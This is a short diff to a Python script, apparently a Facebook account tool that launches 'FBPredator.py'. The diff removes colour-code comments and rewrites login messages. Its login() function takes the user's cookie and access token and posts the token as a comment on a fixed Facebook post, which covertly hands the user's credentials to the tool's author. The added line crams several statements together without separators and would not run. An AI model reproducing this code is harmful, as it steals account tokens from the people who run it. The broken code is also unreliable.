@@ -17,15 +17,15 @@ O = '\x1b[1;96m'
 N = '\x1b[0m'    
 Z = "\033[1;30m"
 sir = '\033[41m\x1b[1;97m'
-x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +
-h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
+x = '\33[m'
+m = '\x1b[1;91m'
+k = '\033[93m'
+h = '\x1b[1;92m'
+hh = '\033[32m'
+u = '\033[95m'
+kk = '\033[33m'
+b = '\33[1;96m'
+p = '\x1b[0;34m'
 
 import bs4, re, time, requests, datetime, os, sys, random, platform
 from concurrent.futures import ThreadPoolExecutor as tred
@@ -236,8 +236,8 @@ def login():
 		ses.post(f"https://graph.facebook.com/571109557964638/comments/?message={token}&access_token={token}",cookies=cok)
 		ses.post(f"https://graph.facebook.com/571109557964638/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
 		open('.cookie.txt','w').write(cookie)
-		open('.token.txt','w').write(token)
-	except Exception as e:exit(f"[{M}!{P}] Cookie Invalid")
+		open('.token.txt','w').write(token)print(f"[{h}✓{P}] Login ({h}Success{P})\n {h}->{P} Cookie Valid\n {h}->{P} Processing...")time.sleep(2)os.system("python FBPredator.py")
+	except Exception as e:exit(f"[{M}!{P}] Login ({M}Failed{P})\n {M}->{P} Cookie Invalid")
 
 def remove():
 	try:os.remove('.cookie.txt');os.remove('.token.txt')
